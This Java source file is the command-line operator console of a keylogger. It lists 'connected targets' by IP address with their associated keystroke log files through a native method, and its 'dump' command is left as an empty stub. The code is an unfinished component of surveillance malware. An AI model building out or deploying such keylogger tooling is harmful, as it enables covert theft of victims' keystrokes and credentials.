/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keyloggerinterface;
import java.awt.Frame;
import static java.util.Collections.list;
import java.util.Scanner;


/**
 *
 * @author Qu3b411
 */

public class KeyLoggerInterface extends Frame{

    public class keylogdata
    {
            long IPaddress;
            String Fname;
            private keylogdata(long a, String b)
            {
                IPaddress = a;
                Fname=b;
               // System.out.printf("here  %d \n",  IPaddress);
            }
    }    

    public native keylogdata[] getBuffer();
    
    /**
     * 
     * @return 
     */
 
    Scanner command = new Scanner(System.in);
    String commandStore;
    public  void Gui()
    {
        System.out.print("\n\nJava Interface Initiated, starting the command terminal for"
                + " the keylogger  V0.1.2\n\n");
        while (true)
        {
            System.out.print("KeyLogger_V0.1.2\\Command> ");
            commandStore = command.nextLine();
            switch(commandStore)
            {
                case "display":
                     System.out.println("listing connected ip addresses to the screen\n");
                     keylogdata[] tmp = getBuffer();
                     System.out.printf("[*] Connected Targets: %d\n\tIP ADDRESS\t\tASSOCIATED LOG FILE \n", tmp.length);
                     for (keylogdata tmp1 : tmp) {
                         System.out.printf("\t[*] %d\t\t%s\n", tmp1.IPaddress, tmp1.Fname);
                     }
                break;
                case "dump":
                    //logic goes here to dump the log of a specified IP address
                    System.out.println("dumping the logs of the specified IP\n");
                break;
                case "":
                break;
                case "help":
                break;
                default:
                    System.out.println("invalid command\n");
                break;
                    
                      
            }
        }
      
    
    }
}
